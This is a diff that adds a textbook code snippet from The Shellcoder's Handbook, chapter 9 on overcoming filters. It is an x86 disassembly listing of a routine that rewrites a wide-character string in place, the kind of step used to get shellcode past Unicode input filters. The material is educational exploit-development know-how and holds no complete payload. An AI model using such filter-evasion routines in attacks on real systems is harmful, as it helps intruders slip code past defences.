@@ -1,0 +1,39 @@
+/*
+
+The Shellcoder's Handbook: Discovering and Exploiting Security Holes
+Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
+Sinan Eren, Neel Mehta, Riley Hassell
+Publisher: John Wiley & Sons
+ISBN: 0764544683
+
+Chapter 9: Overcomming Filters
+Code Snippet #8
+
+Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 
+
+*/
+
+
+
+004010B4 83 C7 23             add         edi,23h
+004010B7 33 C0                xor         eax,eax
+004010B9 33 C9                xor         ecx,ecx
+004010BB F7 D1                not         ecx
+004010BD F2 66 AF             repne scas  word ptr [edi]
+004010C0 F7 D1                not         ecx
+004010C2 D1 E1                shl         ecx,1
+004010C4 2B F9                sub         edi,ecx
+004010C6 83 E9 04             sub         ecx,4
+004010C9 47                   inc         edi
+
+here:
+004010CA 49                   dec         ecx
+004010CB 8A 14 0F             mov         dl,dword ptr [edi+ecx]
+004010CE 88 17                mov         byte ptr [edi],dl
+004010D0 47                   inc         edi
+004010D1 47                   inc         edi
+004010D2 49                   dec         ecx
+004010D3 49                   dec         ecx
+004010D4 49                   dec         ecx
+004010D5 75 F3                jne         here (004010ca)
+
